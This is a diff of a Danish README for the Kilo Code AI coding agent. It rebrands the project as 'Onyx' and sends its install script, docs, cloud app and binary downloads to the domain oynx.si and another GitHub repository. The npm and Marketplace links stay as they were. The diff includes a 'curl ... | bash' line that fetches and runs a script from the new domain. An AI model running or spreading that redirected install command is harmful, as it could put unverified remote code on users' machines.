@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  <a href="https://kilo.ai"><img width="250" alt="Kilo Code logo" src="https://github.com/user-attachments/assets/bdb0c174-b9fd-40ad-a47b-f3aab9b54e8d" /></a>
+  <a href="https://oynx.si"><img width="250" alt="Onyx logo" src="https://github.com/user-attachments/assets/bdb0c174-b9fd-40ad-a47b-f3aab9b54e8d" /></a>
 </p>
 
 <p align="center">Den open source-kodeagent til at bygge med AI i VS Code, JetBrains eller CLI.</p>
@@ -12,8 +12,8 @@
   <a href="https://marketplace.visualstudio.com/items?itemName=kilocode.Kilo-Code"><img src="https://raster.shields.io/badge/VS_Code_Marketplace-007ACC?style=flat&logo=visualstudiocode&logoColor=white" alt="VS Code Marketplace" height="20"></a>
   <a href="https://www.npmjs.com/package/@kilocode/cli"><img alt="npm" src="https://raster.shields.io/npm/v/@kilocode/cli?style=flat" height="20" /></a>
   <a href="https://x.com/kilocode"><img src="https://raster.shields.io/badge/kilocode-000000?style=flat&logo=x&logoColor=white" alt="X (Twitter)" height="20"></a>
-  <a href="https://blog.kilo.ai"><img src="https://raster.shields.io/badge/Blog-555?style=flat&logo=substack&logoColor=white" alt="Blog" height="20"></a>
-  <a href="https://kilo.ai/discord"><img src="https://raster.shields.io/badge/Join%20Discord-5865F2?style=flat&logo=discord&logoColor=white" alt="Discord" height="20"></a>
+  <a href="https://blog.oynx.si"><img src="https://raster.shields.io/badge/Blog-555?style=flat&logo=substack&logoColor=white" alt="Blog" height="20"></a>
+  <a href="https://oynx.si/discord"><img src="https://raster.shields.io/badge/Join%20Discord-5865F2?style=flat&logo=discord&logoColor=white" alt="Discord" height="20"></a>
   <a href="https://www.reddit.com/r/kilocode/"><img src="https://raster.shields.io/badge/Join%20r%2Fkilocode-D84315?style=flat&logo=reddit&logoColor=white" alt="Reddit" height="20"></a>
 </p>
 
@@ -21,7 +21,7 @@
 
 ---
 
-Kilo Code er en AI-kodeagent, der møder dig overalt, hvor du arbejder: [VS Code](https://kilo.ai/landing/vs-code), [JetBrains](https://kilo.ai/features/jetbrains-native) og [CLI](https://kilo.ai/cli). Den er open source med åben prissætning. Du vælger mellem mere end 500 modeller, skifter mellem dem midt i en opgave og betaler modeludbyderens pris uden tillæg. Ingen API-nøgler kræves for at komme i gang.
+Onyx er en AI-kodeagent, der møder dig overalt, hvor du arbejder: [VS Code](https://oynx.si/landing/vs-code), [JetBrains](https://oynx.si/features/jetbrains-native) og [CLI](https://oynx.si/cli). Den er open source med åben prissætning. Du vælger mellem mere end 500 modeller, skifter mellem dem midt i en opgave og betaler modeludbyderens pris uden tillæg. Ingen API-nøgler kræves for at komme i gang.
 
 ### Installation
 
@@ -32,7 +32,7 @@ Vælg, hvor du vil køre Kilo.
 
 <br>
 
-Installer [Kilo Code-udvidelsen](vscode:extension/kilocode.kilo-code) direkte, eller hent den fra [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=kilocode.Kilo-Code). Opret en konto, og du får adgang til mere end 500 modeller, herunder GPT-5.5, Claude Opus 4.7, Claude Sonnet 4.6 og Gemini 3.1 Pro Preview, alle til udbyderpris.
+Installer [Onyx-udvidelsen](vscode:extension/kilocode.kilo-code) direkte, eller hent den fra [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=kilocode.Kilo-Code). Opret en konto, og du får adgang til mere end 500 modeller, herunder GPT-5.5, Claude Opus 4.7, Claude Sonnet 4.6 og Gemini 3.1 Pro Preview, alle til udbyderpris.
 
 </details>
 
@@ -46,7 +46,7 @@ Installer [Kilo Code-udvidelsen](vscode:extension/kilocode.kilo-code) direkte, e
 npm install -g @kilocode/cli
 
 # curl
-curl -fsSL https://kilo.ai/cli/install | bash
+curl -fsSL https://oynx.si/cli/install | bash
 
 # pnpm
 pnpm add -g @kilocode/cli
@@ -70,7 +70,7 @@ Kør derefter `kilo` i en vilkårlig projektmappe for at starte.
 
 <br>
 
-Installer [Kilo Code-pluginet](https://plugins.jetbrains.com/plugin/28350-kilo-code) fra JetBrains Marketplace, eller søg efter "Kilo Code" i `Settings → Plugins` i en JetBrains IDE.
+Installer [Onyx-pluginet](https://plugins.jetbrains.com/plugin/28350-kilo-code) fra JetBrains Marketplace, eller søg efter "Onyx" i `Settings → Plugins` i en JetBrains IDE.
 
 </details>
 
@@ -79,7 +79,7 @@ Installer [Kilo Code-pluginet](https://plugins.jetbrains.com/plugin/28350-kilo-c
 
 <br>
 
-Kør Kilo fra webben, uden lokal maskine, på [app.kilo.ai/cloud](https://app.kilo.ai/cloud).
+Kør Kilo fra webben, uden lokal maskine, på [app.oynx.si/cloud](https://app.oynx.si/cloud).
 
 </details>
 
@@ -88,14 +88,14 @@ Kør Kilo fra webben, uden lokal maskine, på [app.kilo.ai/cloud](https://app.ki
 
 <br>
 
-Opsæt automatiske AI-kodegennemgange på dine pull requests på [app.kilo.ai/code-reviews](https://app.kilo.ai/code-reviews).
+Opsæt automatiske AI-kodegennemgange på dine pull requests på [app.oynx.si/code-reviews](https://app.oynx.si/code-reviews).
 
 </details>
 
 <details>
 <summary>Installer CLI fra GitHub Releases (binære filer)</summary>
 
-Download den nyeste binære fil fra [Releases-siden](https://github.com/Kilo-Org/kilocode/releases).
+Download den nyeste binære fil fra [Releases-siden](https://github.com/Manash8666/oynx.git/releases).
 
 | Platform | Asset |
 |---|---|
@@ -119,7 +119,7 @@ Kilo leveres med specialiserede agents, som du kan skifte mellem afhængigt af o
 - **Debug** - Fejlfinder og sporer problemer.
 - **Review** - Gennemgår dine ændringer og finder problemer med ydeevne, sikkerhed, stil og testdækning.
 
-Læs mere om [agents og brugerdefinerede agents](https://kilo.ai/docs/code-with-ai/agents/using-agents).
+Læs mere om [agents og brugerdefinerede agents](https://oynx.si/docs/code-with-ai/agents/using-agents).
 
 ### Hvad den gør
 
@@ -142,7 +142,7 @@ kilo run --auto "run tests and fix any failures"
 
 ### Dokumentation
 
-For konfiguration og alt andet, se [dokumentationen](https://kilo.ai/docs).
+For konfiguration og alt andet, se [dokumentationen](https://oynx.si/docs).
 
 ### Bidrag
 
@@ -157,12 +157,12 @@ MIT. Du kan bruge, ændre og distribuere denne kode, også kommercielt, så læn
 ### FAQ
 
 <details>
-<summary>Hvor kommer Kilo CLI fra?</summary>
+<summary>Hvor kommer Onyx CLI fra?</summary>
 
-Kilo CLI er en fork af [OpenCode](https://github.com/anomalyco/opencode), forbedret til at fungere i Kilo agentic engineering-platformen.
+Onyx CLI er en fork af [OpenCode](https://github.com/anomalyco/opencode), forbedret til at fungere i Kilo agentic engineering-platformen.
 
 </details>
 
 ---
 
-**Deltag i fællesskabet** [Discord](https://kilo.ai/discord) | [X](https://x.com/kilocode) | [Reddit](https://www.reddit.com/r/kilocode/)
+**Deltag i fællesskabet** [Discord](https://oynx.si/discord) | [X](https://x.com/kilocode) | [Reddit](https://www.reddit.com/r/kilocode/)
